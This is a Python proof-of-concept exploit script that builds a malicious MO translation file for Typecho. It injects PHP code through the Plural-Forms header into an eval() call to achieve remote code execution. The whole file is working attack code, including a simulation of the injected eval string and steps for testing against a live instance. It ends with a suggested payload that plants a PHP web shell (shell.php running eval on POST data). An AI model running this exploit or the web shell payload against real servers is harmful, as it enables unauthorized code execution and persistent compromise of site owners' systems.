#!/usr/bin/env python3
"""
Typecho GetText eval() RCE - Malicious MO File Constructor

This script demonstrates how to construct a malicious MO (Machine Object)
translation file with an injected Plural-Forms header that triggers
arbitrary code execution when Typecho processes it.

Usage:
    python3 build_malicious_mo.py
    python3 build_malicious_mo.py --payload "system('id');"
    python3 build_malicious_mo.py --output /path/to/usr/langs/zh_CN.mo
"""

import argparse
import struct
import os


def build_mo_string(msgid: bytes, msgstr: bytes) -> bytes:
    """Build a simple MO file binary string."""
    # MO file magic number
    magic = struct.pack('<I', 0x950412de)
    
    # Revision
    revision = struct.pack('<I', 0)
    
    # Number of strings (1 entry)
    num_strings = struct.pack('<I', 1)
    
    # Offset of original string table (after header)
    offset_original = struct.pack('<I', 28)
    
    # Offset of translated string table (after original table)
    offset_translated = struct.pack('<I', 28 + 8)  # 28 + (1 * 8)
    
    # Size of hashing table = 0
    hash_size = struct.pack('<I', 0)
    hash_offset = struct.pack('<I', 0)
    
    # Original string table entry
    # Each entry: length (4 bytes) + offset (4 bytes)
    msgid_len = struct.pack('<I', len(msgid))
    msgid_offset = struct.pack('<I', 28 + 16)  # header(28) + 2 tables * 1 entry * 8 bytes
    
    # Translated string table entry
    msgstr_len = struct.pack('<I', len(msgstr))
    msgstr_offset = struct.pack('<I', 28 + 16 + len(msgid) + 1)  # after msgid + null
    
    # Assemble
    mo = magic + revision + num_strings
    mo += offset_original + offset_translated
    mo += hash_size + hash_offset
    mo += msgid_len + msgid_offset
    mo += msgstr_len + msgstr_offset
    mo += msgid + b'\x00'
    mo += msgstr + b'\x00'
    
    return mo


def main():
    parser = argparse.ArgumentParser(
        description='Build malicious MO file for Typecho GetText eval() RCE'
    )
    parser.add_argument(
        '--payload',
        default="system('echo PWNED_BY_GETTEXT_EVAL');",
        help='PHP code to inject into Plural-Forms header'
    )
    parser.add_argument(
        '--nplurals',
        type=int,
        default=1,
        help='Number of plural forms'
    )
    parser.add_argument(
        '--plural-expr',
        default='plural=0',
        help='Base plural expression (before injection)'
    )
    parser.add_argument(
        '--output',
        default='malicious_zh_CN.mo',
        help='Output MO file path'
    )
    args = parser.parse_args()
    
    # Construct malicious Plural-Forms header
    plural_forms = f"nplurals={args.nplurals}; {args.plural_expr};{args.payload}"
    
    print("=" * 60)
    print("Typecho GetText eval() RCE - MO File Constructor")
    print("=" * 60)
    print()
    print(f"[+] Malicious Plural-Forms expression:")
    print(f"    {plural_forms}")
    print()
    
    # Build msgstr (header) with the malicious Plural-Forms
    header = f"""Project-Id-Version: Typecho 1.3.0\\n
POT-Creation-Date: 2025-01-01 00:00+0800\\n
PO-Revision-Date: 2025-01-01 00:00+0800\\n
Last-Translator: Attacker\\n
Language-Team: Malicious\\n
MIME-Version: 1.0\\n
Content-Type: text/plain; charset=UTF-8\\n
Plural-Forms: {plural_forms}\\n
"""
    
    msgid = b''  # Empty msgid = header entry
    msgstr = header.encode('utf-8')
    
    mo_data = build_mo_string(msgid, msgstr)
    
    with open(args.output, 'wb') as f:
        f.write(mo_data)
    
    print(f"[+] Malicious MO file written to: {args.output}")
    print(f"[+] File size: {len(mo_data)} bytes")
    print()
    print("[+] Simulated eval execution (what Typecho would run):")
    print()
    
    # Simulate what Typecho's selectString() does
    n = 2  # Any number != 1 triggers plural logic
    string = plural_forms
    string = string.replace('nplurals', '$total')
    string = string.replace('n', str(n))
    string = string.replace('plural', '$plural')
    
    print(f"    string after str_replace:")
    print(f"    >>> {string}")
    print()
    print("[!] In PHP, eval() would execute the injected code above.")
    print("[!] This would result in Remote Code Execution on the server.")
    print()
    print("[*] To test on a live Typecho instance:")
    print(f"    1. Replace usr/langs/<lang>.mo with {args.output}")
    print(f"    2. Visit any page that triggers _n() with count != 1")
    print(f"    3. The injected PHP code will execute")
    print()
    print("[*] For more advanced payloads:")
    print(f"    --payload \"file_put_contents('shell.php','<?php @eval(\\$_POST[1]);');\"")


if __name__ == '__main__':
    main()
